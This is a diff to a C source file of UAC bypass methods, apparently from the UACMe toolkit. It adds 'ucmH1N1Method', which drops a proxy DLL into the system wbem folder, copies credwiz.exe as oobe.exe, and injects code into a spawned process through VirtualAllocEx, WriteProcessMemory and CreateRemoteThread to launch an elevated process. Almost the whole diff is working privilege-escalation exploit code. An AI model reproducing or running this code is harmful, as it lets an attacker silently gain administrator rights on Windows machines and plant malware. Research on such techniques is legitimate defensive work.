@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     1.90
+*  VERSION:     1.91
 *
-*  DATE:        17 Sept 2015
+*  DATE:        12 Oct 2015
 *
 *  Hybrid UAC bypass methods.
 *
@@ -18,6 +18,8 @@
 *******************************************************************************/
 #include "global.h"
 #include "makecab.h"
+
+ELOAD_PARAMETERS_4 g_ElevParamsH1N1;
 
 #define T_IFEO                L"MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
 #define T_AVRFDLL             L"Hibiki.dll"
@@ -335,9 +337,6 @@ BOOL ucmMMCMethod(
 		return bResult;
 	}
 
-	RtlSecureZeroMemory(szSource, sizeof(szSource));
-	RtlSecureZeroMemory(szDest, sizeof(szDest));
-
 	do {
 
 		//put target dll
@@ -381,5 +380,176 @@ BOOL ucmMMCMethod(
 
 	} while (cond);
 
+	return bResult;
+}
+
+DWORD WINAPI ucmElevatedLaunchProc(
+	PELOAD_PARAMETERS_4 elvpar
+	)
+{
+	BOOL				cond = FALSE;
+	SHELLEXECUTEINFOW   shexec;
+
+	if (elvpar == NULL)
+		return (DWORD)E_FAIL;
+
+	do {
+
+		shexec.cbSize = sizeof(shexec);
+		shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
+		shexec.nShow = SW_SHOW;
+		shexec.lpVerb = elvpar->szVerb;
+		shexec.lpFile = elvpar->szTargetApp;
+		shexec.lpParameters = NULL;
+		shexec.lpDirectory = NULL;
+		if (elvpar->xShellExecuteExW(&shexec))
+			if (shexec.hProcess != NULL) {
+				elvpar->xWaitForSingleObject(shexec.hProcess, INFINITE);
+				elvpar->xCloseHandle(shexec.hProcess);
+			}
+
+	} while (cond);
+
+	return S_OK;
+}
+
+/*
+* ucmH1N1Method
+*
+* Purpose:
+*
+* Bypass UAC by abusing OOBE.exe backdoor hardcoded in appinfo.dll
+*
+*/
+BOOL ucmH1N1Method(
+	PVOID ProxyDll,
+	DWORD ProxyDllSize
+	)
+{
+	BOOL					cond = FALSE, bResult = FALSE;
+	DWORD					c;
+	HANDLE					hProcess = NULL, hRemoteThread = NULL;
+	HINSTANCE               selfmodule = GetModuleHandle(NULL);
+	PIMAGE_DOS_HEADER       pdosh = (PIMAGE_DOS_HEADER)selfmodule;
+	PIMAGE_FILE_HEADER      fh = (PIMAGE_FILE_HEADER)((char *)pdosh + pdosh->e_lfanew + sizeof(DWORD));
+	PIMAGE_OPTIONAL_HEADER  opth = (PIMAGE_OPTIONAL_HEADER)((char *)fh + sizeof(IMAGE_FILE_HEADER));
+	LPVOID                  remotebuffer = NULL, newEp, newDp;
+	SIZE_T                  NumberOfBytesWritten = 0;
+	PELOAD_PARAMETERS_4     elvpar = &g_ElevParamsH1N1;
+	LPVOID                  elevproc = ucmElevatedLaunchProc;
+
+	WCHAR szBuffer[MAX_PATH * 2];
+	WCHAR szDest[MAX_PATH + 1];
+	WCHAR szSource[MAX_PATH + 1];
+
+	if (
+		(ProxyDll == NULL) ||
+		(ProxyDllSize == 0)
+		)
+	{
+		return bResult;
+	}
+
+	do {
+		//put Fubuki dll as netutils to %temp%
+		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+		_strcpy_w(szBuffer, TEMPDIR);
+		_strcat_w(szBuffer, L"netutils.dll");
+		RtlSecureZeroMemory(szSource, sizeof(szSource));
+		if (ExpandEnvironmentStrings(szBuffer, szSource, MAX_PATH) == 0) {
+			break;
+		}
+		if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
+			OutputDebugString(TEXT("[UCM] Failed to drop dll"));
+			break;
+		}
+		else {
+			OutputDebugStringW(TEXT("[UCM] Dll dropped successfully"));
+		}
+
+		//copy dll to wbem target folder
+		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+		if (ExpandEnvironmentStringsW(WBEMDIR,
+			szBuffer, MAX_PATH) == 0)
+		{
+			break;
+		}
+		//note: uacmAutoElevateCopyFile uses injection to explorer.exe
+		bResult = ucmAutoElevateCopyFile(szSource, szBuffer);
+		if (!bResult) {
+			break;
+		}
+
+		//copy 1st stage target process
+		RtlSecureZeroMemory(szSource, sizeof(szSource));
+		if (ExpandEnvironmentStrings(L"%systemroot%\\system32\\credwiz.exe",
+			szSource, MAX_PATH) == 0)
+		{
+			break;
+		}
+
+		RtlSecureZeroMemory(szDest, sizeof(szDest));
+		if (ExpandEnvironmentStrings(L"%temp%\\oobe.exe",
+			szDest, MAX_PATH) == 0)
+		{
+			break;
+		}
+		if (!CopyFile(szSource, szDest, FALSE)) {
+			break;
+		}
+		bResult = ucmAutoElevateCopyFile(szDest, szBuffer);
+		if (!bResult) {
+			break;
+		}
+
+		//setup basic shellcode routines
+		RtlSecureZeroMemory(&g_ElevParamsH1N1, sizeof(g_ElevParamsH1N1));
+		elvpar->xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(g_ldp.hShell32, "ShellExecuteExW");
+		elvpar->xWaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(g_ldp.hKernel32, "WaitForSingleObject");
+		elvpar->xCloseHandle = (pfnCloseHandle)GetProcAddress(g_ldp.hKernel32, "CloseHandle");
+
+		//set shellcode 2nd stage target process
+		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+		_strcpy_w(elvpar->szTargetApp, g_ldp.szSystemDirectory); //c:\windows\system32\wbem\oobe.exe
+		_strcat_w(elvpar->szTargetApp, L"\\wbem\\oobe.exe");
+		_strcpy_w(elvpar->szVerb, L"runas");
+		_strcpy_w(szBuffer, g_ldp.szSystemDirectory); //c:\windows\system32\credwiz.exe
+		_strcat_w(szBuffer, L"\\credwiz.exe");
+
+		//run 1st stage target process
+		hProcess = supRunProcessEx(szBuffer, NULL, NULL);
+		if (hProcess == NULL) {
+			OutputDebugString(TEXT("[UCM] Cannot open target process."));
+			break;
+		}
+
+		remotebuffer = VirtualAllocEx(hProcess, NULL, (SIZE_T)opth->SizeOfImage,
+			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+		if (remotebuffer == NULL) {
+			OutputDebugString(TEXT("[UCM] Cannot allocate memory in target process."));
+			break;
+		}
+		if (!WriteProcessMemory(hProcess, remotebuffer, selfmodule, opth->SizeOfImage, &NumberOfBytesWritten)) {
+			OutputDebugString(TEXT("[UCM] Cannot write to the target process memory."));
+			break;
+		}
+
+		newEp = (char *)remotebuffer + ((char *)elevproc - (char *)selfmodule);
+		newDp = (char *)remotebuffer + ((char *)elvpar - (char *)selfmodule);
+
+		hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, newEp, newDp, 0, &c);
+		bResult = (hRemoteThread != NULL);
+		if (bResult) {
+			WaitForSingleObject(hRemoteThread, INFINITE);
+			CloseHandle(hRemoteThread);
+		}
+
+	} while (cond);
+
+	if (hProcess != NULL) {
+		TerminateProcess(hProcess, 0);
+		CloseHandle(hProcess);
+	}
 	return bResult;
 }
